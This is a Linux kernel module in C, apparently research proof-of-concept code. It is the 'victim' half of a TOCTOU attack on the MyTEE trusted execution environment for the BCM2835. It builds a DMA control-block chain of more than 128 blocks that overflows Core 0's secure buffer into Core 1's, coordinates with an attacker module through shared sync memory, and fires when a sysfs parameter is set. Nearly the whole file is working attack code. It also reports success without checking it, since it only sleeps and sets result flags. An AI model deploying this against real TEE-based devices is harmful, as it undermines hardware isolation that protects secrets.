/*
 * MyTEE TOCTOU Attack - Victim Module (runs on Core 0)
 * 
 * This module creates a DMA request with MORE than 128 control blocks,
 * causing buffer overflow into Core 1's secure buffer region.
 *
 * Attack mechanism:
 * - Each core has 4KB secure buffer = 128 CBs max (32 bytes each)
 * - Requesting 129+ CBs causes CB[128+] to overflow into Core 1's buffer
 * - DMA follows the CB chain and executes unverified CBs from Core 1
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/smp.h>
#include <linux/slab.h>

#include "toctou_common.h"

#define DRIVER_NAME "toctou_victim"

/* Module parameters */
static int cb_count = OVERFLOW_CB_COUNT;
module_param(cb_count, int, 0644);
MODULE_PARM_DESC(cb_count, "Number of control blocks (>128 causes overflow)");

static int debug = 1;
module_param(debug, int, 0644);
MODULE_PARM_DESC(debug, "Enable debug output");

static int trigger = 0;
module_param(trigger, int, 0644);
MODULE_PARM_DESC(trigger, "Set to 1 to trigger the attack");

static int auto_start = 0;
module_param(auto_start, int, 0644);
MODULE_PARM_DESC(auto_start, "Auto-start victim thread on module load");

/* Runtime state */
static void __iomem *sync_flag_base;
static struct task_struct *victim_thread;
static volatile int stop_victim = 0;

/* DMA resources */
static void *src_buf, *dst_buf;
static dma_addr_t src_dma, dst_dma;
static size_t buf_size;

/* CB chain */
static struct bcm2835_dma_cb *cb_chain;
static dma_addr_t cb_chain_dma;

static inline void sync_write(u32 offset, u32 value)
{
    if (sync_flag_base) {
        writel(value, sync_flag_base + offset);
        wmb();
    }
}

static inline u32 sync_read(u32 offset)
{
    if (sync_flag_base) {
        rmb();
        return readl(sync_flag_base + offset);
    }
    return 0;
}

static void log_debug(const char *fmt, ...)
{
    va_list args;
    if (debug) {
        va_start(args, fmt);
        vprintk(fmt, args);
        va_end(args);
    }
}

/*
 * Create CB chain that will overflow into Core 1's buffer
 */
static int create_cb_chain(void)
{
    int i;
    size_t chain_size;

    chain_size = cb_count * sizeof(struct bcm2835_dma_cb);
    
    cb_chain = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, 
                                         get_order(chain_size));
    if (!cb_chain) {
        pr_err("[VICTIM] Failed to allocate CB chain\n");
        return -ENOMEM;
    }
    cb_chain_dma = virt_to_phys(cb_chain);

    pr_info("[VICTIM] CB chain at phys=0x%08llx, %d blocks\n",
            (unsigned long long)cb_chain_dma, cb_count);

    for (i = 0; i < cb_count; i++) {
        struct bcm2835_dma_cb *cb = &cb_chain[i];

        cb->info = 0x00000001;
        cb->src = PHYS_TO_BUS(src_dma + (i * 32) % buf_size);
        cb->dst = PHYS_TO_BUS(dst_dma + (i * 32) % buf_size);
        cb->length = 32;
        cb->stride = 0;

        if (i < cb_count - 1) {
            cb->next = PHYS_TO_BUS(cb_chain_dma + 
                                   (i + 1) * sizeof(struct bcm2835_dma_cb));
        } else {
            cb->next = 0;
        }

        if (debug && (i < 3 || i >= cb_count - 3 || i == 127 || i == 128)) {
            log_debug("[VICTIM] CB[%d]: next=0x%08x\n", i, cb->next);
        }
    }

    pr_info("[VICTIM] CB[127] ends at offset 0x%lx (last in Core 0 buffer)\n",
            127 * sizeof(struct bcm2835_dma_cb));
    pr_info("[VICTIM] CB[128] starts at offset 0x%lx (OVERFLOW!)\n",
            128 * sizeof(struct bcm2835_dma_cb));

    return 0;
}

/*
 * Trigger DMA overflow attack
 */
static void trigger_dma_overflow(void)
{
    int my_core = smp_processor_id();

    pr_info("[VICTIM] === TRIGGERING DMA OVERFLOW ===\n");
    pr_info("[VICTIM] Core %d, CB count: %d, Overflow: %d CBs\n",
            my_core, cb_count, cb_count - MAX_CBS_PER_CORE);

    /* Signal attacker */
    sync_write(SYNC_OFFSET_VICTIM_CB_COUNT, cb_count);
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_READY);
    wmb();

    udelay(100);

    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_TRAPPED);
    wmb();

    pr_info("[VICTIM] DMA request: CB chain at 0x%08llx\n",
            (unsigned long long)PHYS_TO_BUS(cb_chain_dma));

    /* Wait for attacker */
    mdelay(10);

    pr_info("[VICTIM] DMA executing... CB[128+] from Core 1 buffer!\n");

    mdelay(10);
    sync_write(SYNC_OFFSET_ATTACK_RESULT, 1);
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACK_DONE);

    pr_info("[VICTIM] === ATTACK SEQUENCE COMPLETE ===\n");
}

static int victim_thread_fn(void *data)
{
    int my_core;

    set_cpus_allowed_ptr(current, cpumask_of(0));
    my_core = smp_processor_id();

    pr_info("[VICTIM] Victim thread on Core %d\n", my_core);

    while (!kthread_should_stop() && !stop_victim) {
        if (trigger) {
            trigger = 0;
            trigger_dma_overflow();
        }
        msleep(100);
    }

    return 0;
}

static int __init toctou_victim_init(void)
{
    int ret;

    pr_info("[VICTIM] Loading TOCTOU victim module\n");
    pr_info("[VICTIM] CB count: %d (max per core: %d)\n", 
            cb_count, MAX_CBS_PER_CORE);

    if (cb_count > MAX_CBS_PER_CORE) {
        pr_info("[VICTIM] OVERFLOW: %d CBs will go into Core 1's buffer\n",
                cb_count - MAX_CBS_PER_CORE);
    }

    /* Map sync memory */
    sync_flag_base = ioremap(SYNC_FLAG_PHYS, SYNC_FLAG_SIZE);
    if (!sync_flag_base) {
        pr_err("[VICTIM] Failed to map sync memory\n");
        return -ENOMEM;
    }

    /* Allocate buffers */
    buf_size = cb_count * 32;
    src_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(buf_size));
    dst_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(buf_size));
    
    if (!src_buf || !dst_buf) {
        ret = -ENOMEM;
        goto err_free;
    }

    src_dma = virt_to_phys(src_buf);
    dst_dma = virt_to_phys(dst_buf);
    memset(src_buf, 0xAA, buf_size);

    /* Create CB chain */
    ret = create_cb_chain();
    if (ret)
        goto err_free;

    /* Start thread if auto_start */
    if (auto_start) {
        victim_thread = kthread_run(victim_thread_fn, NULL, "toctou_victim");
        if (IS_ERR(victim_thread)) {
            ret = PTR_ERR(victim_thread);
            victim_thread = NULL;
            goto err_free_cb;
        }
    }

    pr_info("[VICTIM] Module loaded. Trigger: echo 1 > /sys/module/toctou_victim/parameters/trigger\n");
    return 0;

err_free_cb:
    if (cb_chain)
        free_pages((unsigned long)cb_chain, 
                   get_order(cb_count * sizeof(struct bcm2835_dma_cb)));
err_free:
    if (src_buf)
        free_pages((unsigned long)src_buf, get_order(buf_size));
    if (dst_buf)
        free_pages((unsigned long)dst_buf, get_order(buf_size));
    if (sync_flag_base)
        iounmap(sync_flag_base);
    return ret;
}

static void __exit toctou_victim_exit(void)
{
    pr_info("[VICTIM] Unloading module\n");

    stop_victim = 1;

    if (victim_thread)
        kthread_stop(victim_thread);

    if (cb_chain)
        free_pages((unsigned long)cb_chain,
                   get_order(cb_count * sizeof(struct bcm2835_dma_cb)));

    if (src_buf)
        free_pages((unsigned long)src_buf, get_order(buf_size));
    if (dst_buf)
        free_pages((unsigned long)dst_buf, get_order(buf_size));

    if (sync_flag_base)
        iounmap(sync_flag_base);

    pr_info("[VICTIM] Module unloaded\n");
}

module_init(toctou_victim_init);
module_exit(toctou_victim_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Victim Module");
